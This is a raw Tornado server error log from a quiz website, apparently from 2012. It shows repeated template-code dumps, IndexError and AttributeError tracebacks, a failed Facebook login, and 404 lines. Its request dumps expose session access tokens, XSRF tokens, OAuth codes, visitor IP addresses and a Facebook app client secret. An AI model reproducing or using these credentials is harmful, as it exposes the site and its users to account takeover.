 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505850bc8e4c85782ae2b6dc&answers=%5B1%5D&cursor=17&_xsrf=36c72ad09a6a45d89e729cf0a7a6c950', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '86.167.54.162', 'Cookie': '_xsrf=36c72ad09a6a45d89e729cf0a7a6c950; access_token="QUFBRzZsTmNzNkdjQkFGWkJ0N2lyT1VNZXdIdHlaQmdqVXlwd3laQlU0cE9yOUhqaGpUYzV5R0JreElweUJQd1hmamVja1Z6ZFJqWkJGSnpwTXVWWkFMUFJ1dm5uYkFWYmVaQWtMa1lFVjFVUVpEWkQ=|1347964993|7a6d0935c48262ba5d4637e9e95f3d6c43606232"; __utma=188782963.2080245892.1347887295.1347923020.1347964982.4; __utmb=188782963.11.10.1347964982; __utmc=188782963; __utmz=188782963.1347887295.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 104.41ms
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
WARNING:root:Facebook auth error: HTTPResponse(code=400,request_time=0.4235200881958008,buffer=<_io.BytesIO object at 0x2118f50>,_body=None,time_info={},request=<tornado.httpclient.HTTPRequest object at 0x2532f50>,effective_url='https://graph.facebook.com/oauth/access_token?client_secret=4049a6a2d8dd781bbfb4a1b849869113&code=AQDN_V1oB3bZ1pfigswXVFeF-hD1TzWmCY6QPjFCjeYS-njOnAhtHK2_5jmLJXL5wk-l5tH_AQ7tBfN8GU9G12fdVvc-Xx_5OU3eaWnPyJlIQ0WWgRnJitkGDG5F48HMx1sjKuBb2yrvl_Kh_zC-0HLJfiRbvMo7N4q6ZKu2XB4lfgUn3JKKoXzLHnvrrv4mfiDkqi943unVcGIcy-SHEoKq&client_id=486623404681319&redirect_uri=http%3A%2F%2Fwww.intheory.co.uk%2Flogin',headers={'Content-Length': '281', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'X-Fb-Debug': 'CFSxE9X/d6nCWYbVMjgk0NOQnQrKtvmmaughhmbuB70=', 'X-Fb-Rev': '628839', 'Connection': 'close', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Date': 'Tue, 18 Sep 2012 11:12:55 GMT', 'Access-Control-Allow-Origin': '*', 'Content-Type': 'text/javascript; charset=UTF-8', 'Www-Authenticate': 'OAuth "Facebook Platform" "invalid_code" "Code was invalid or expired. Session does not match current stored session. This may be because the user changed the password since the time the session was created or Facebook has changed the session for security reasons."'},error=HTTPError('HTTP 400: Bad Request',))
ERROR:root:Uncaught exception GET /login?code=AQDN_V1oB3bZ1pfigswXVFeF-hD1TzWmCY6QPjFCjeYS-njOnAhtHK2_5jmLJXL5wk-l5tH_AQ7tBfN8GU9G12fdVvc-Xx_5OU3eaWnPyJlIQ0WWgRnJitkGDG5F48HMx1sjKuBb2yrvl_Kh_zC-0HLJfiRbvMo7N4q6ZKu2XB4lfgUn3JKKoXzLHnvrrv4mfiDkqi943unVcGIcy-SHEoKq (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login?code=AQDN_V1oB3bZ1pfigswXVFeF-hD1TzWmCY6QPjFCjeYS-njOnAhtHK2_5jmLJXL5wk-l5tH_AQ7tBfN8GU9G12fdVvc-Xx_5OU3eaWnPyJlIQ0WWgRnJitkGDG5F48HMx1sjKuBb2yrvl_Kh_zC-0HLJfiRbvMo7N4q6ZKu2XB4lfgUn3JKKoXzLHnvrrv4mfiDkqi943unVcGIcy-SHEoKq', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/536.25 (KHTML, like Gecko) Version/6.0 Safari/536.25', 'Connection': 'close', 'Cookie': '__utma=188782963.2109519635.1347966676.1347966676.1347966676.1; __utmb=188782963.1.10.1347966676; __utmc=188782963; __utmz=188782963.1347966676.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '86.167.54.162'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 49, in _on_login
    c_user = User.objects(fb_id=user['id']).get()
TypeError: 'NoneType' object has no attribute '__getitem__'
ERROR:root:500 GET /login?code=AQDN_V1oB3bZ1pfigswXVFeF-hD1TzWmCY6QPjFCjeYS-njOnAhtHK2_5jmLJXL5wk-l5tH_AQ7tBfN8GU9G12fdVvc-Xx_5OU3eaWnPyJlIQ0WWgRnJitkGDG5F48HMx1sjKuBb2yrvl_Kh_zC-0HLJfiRbvMo7N4q6ZKu2XB4lfgUn3JKKoXzLHnvrrv4mfiDkqi943unVcGIcy-SHEoKq (127.0.0.1) 432.02ms
ERROR:root:Could not open static file 'imgs/mnemonics/'
WARNING:root:404 GET /login/twitter?oauth_token=ZNIFwCXbXI2NmGoqv5zIVLr9TCElDdKxaUsAHHPkNo&oauth_verifier=Zupq2Uit6tPZk2pevZxKwcaQhHR91ivRAIGwXSycT6c (127.0.0.1) 0.78ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.78ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 1.21ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.75ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.77ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 1.23ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.72ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.74ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.72ms
WARNING:root:404 GET /h (127.0.0.1) 1.17ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.73ms
WARNING:root:404 GET /login/twitter (127.0.0.1) 0.73ms
WARNING:root:404 GET /login/twitter?oauth_token=ZNIFwCXbXI2NmGoqv5zIVLr9TCElDdKxaUsAHHPkNo&oauth_verifier=Zupq2Uit6tPZk2pevZxKwcaQhHR91ivRAIGwXSycT6c (127.0.0.1) 1.20ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.73ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.12ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 0.54ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 47.40ms
ERROR:root:Uncaught exception GET /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1', 'Connection': 'close', 'Cookie': '__utma=188782963.2023730992.1347995447.1347995447.1347995447.1; __utmb=188782963.6.10.1347995447; __utmc=188782963; __utmz=188782963.1347995447.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFLdnBsWWxaQTh4ZWNBQVJwMVBldGMzMnlsOFRpTjZFSnV0RWdVSXNoMWNHZ0lVYlRZWkNxa1pDVFBUSnJBc0JPVkdrWXJWeDRIRUI3V25tZ2NwSU8wdURFUVBoQVpEWkQ=|1347995462|2dc74a5199959332571e86140e6abc6b3457a056"; _xsrf=2e913ddd34a741ffa4e4fa23438c6fbf', 'X-Real-Ip': '86.189.10.175'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 99, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self.log.error(str(httperr))
AttributeError: 'EvaluateTestQuestionHandler' object has no attribute 'log'
ERROR:root:500 GET /test/evaluate (127.0.0.1) 4.74ms
WARNING:root:404 GET /h (127.0.0.1) 1.21ms
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:Could not open static file 'imgs/mnemonics/'
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059c06b8e4c8548017fb423&answers=%5B3%5D&cursor=6&_xsrf=0a1bb57f460240a19b40cff76ef2297a', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.57 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '83.244.221.226', 'Cookie': '_xsrf=0a1bb57f460240a19b40cff76ef2297a; access_token="QUFBRzZsTmNzNkdjQkFNZFlKbDk0MDJKd1B1UHNVaGk3dGdGdGczNG1qMzVDMnN5STJPMWxEaUQ4UW04WkJIWkFkNGlpTmV2UnVVVDQxclM1WFpBVHZFOXFFY1hJdzY3V0ZlU2txQ3hmUVpEWkQ=|1348053554|ac07d46d67d8ee02d32f8ff95325dfe712d40b21"; __utma=188782963.1555786485.1347973685.1348053519.1348059227.3; __utmb=188782963.2.10.1348059227; __utmc=188782963; __utmz=188782963.1347973685.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 210.69ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
